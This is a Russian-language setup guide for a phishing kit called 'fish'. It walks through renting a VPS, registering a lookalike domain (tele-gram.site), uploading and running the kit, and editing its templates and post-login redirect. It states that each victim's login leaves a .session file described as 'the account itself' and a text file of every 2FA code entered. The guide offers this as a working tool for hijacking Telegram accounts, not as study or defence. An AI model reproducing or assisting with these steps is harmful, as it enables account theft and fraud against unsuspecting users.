В папке есть скрины, не забывайте про них, они вам помогут!

1. Купите сервер VPS linux ubuntu 20.04 (можно на reg.ru или лучше на didgitalocean)
Купить можно тут - https://www.reg.ru/vps/
Или тут https://m.do.co/c/7194a70b2668

2. Купить домен для вашего сайта. Можно самый дешевый за 100-200р
Купить можно тут - https://www.reg.ru

3. Свяжите ваш домен с сервером с помощью DNS или IP
Инструкция - https://help.reg.ru/hc/ru/articles/4408054628241-Как-привязать-домен-к-Облачному-серверу
Если не поймете как, напишите в поддержку регистраторов, они вам помогут или сделают за вас.

Теперь нужно периодически проверять подвязлся ли домен к серверу, это зависит от скорости обновления днс записей (от 1 до 24 часов)
Открываем cmd и вводим ping и название своего домена, в моем случае я ввожу ping tele-gram.site
После этого отображается ip к которому привязан домен, если там ваш ip продолжаем по инструкции дальше, если другой ждем еще.

4. Через FileZilla подключитесь к вашему серверу и перенесите папку fish на сервер.
Скачать тут - https://filezilla.ru/get/

5. Подключитесь к вашему серверу через Putty
Скачать тут - https://www.putty.org (первая в списке)

6. Привяжите домен к вашему серверу командой hostname tele-gram.site
(вместо домена введите ваш tele-gram.site)

7. Введите в консоли cd fish и Запустите установщик командой bash install.sh
Начнется установка, если попросит что-то подтвердить, просто жми enter и оно продолжиться.

8. Установите библиотеки командой pip install -r requirements.txt

9. Установите screen командой sudo apt install screen
Более обширная инстрцкция по работе с screen - https://losst.ru/komanda-screen-linux

10. Создайте новый screen командой screen -S qwe (qwe это название вашего скрина, может быть любое - латинское)

pip install black
pip install click

11. Запустите скрипт командой python main.py

12. Можете войти на свой сайт и протестировать его



Пару моментов которые помогут работать со скриптом.
1. Редактирования дизайна сайта в папке fish/templates/ и тут все файлы с окончанием .html
После редактирования войти на сервер через патти. Войди в свой скрин командой screen -r qwe
Дальше отключи скрипт комбинацией ctrl+c и запусти заново python main.py

Изменения внесенные в .html применятся на сайте.

2. Что бы изменить перенаправление после удачной авторазации сделай это в main.py в самом низу/
После редактирования войти на сервер через патти. Войди в свой скрин командой screen -r qwe
Дальше отключи скрипт комбинацией ctrl+c и запусти заново python main.py

Изменения внесенные в .py применятся на сайте.

3. В папке fish после авторизации появяться 1-2 файла:
номер.session - это сам акк
номер.txt - тут будут содержаться все введенные 2fa

Если после запуска есть такая ошибка:
ImportError: cannot import name 'ParameterSource' from 'click.core' (/usr/lib/python3/dist-packages/click/core.py)
root@acc-good:~/fish#

Тогда введите такую команду и после нее сделате запуск:
pip install --force-reinstall --upgrade typed-ast black
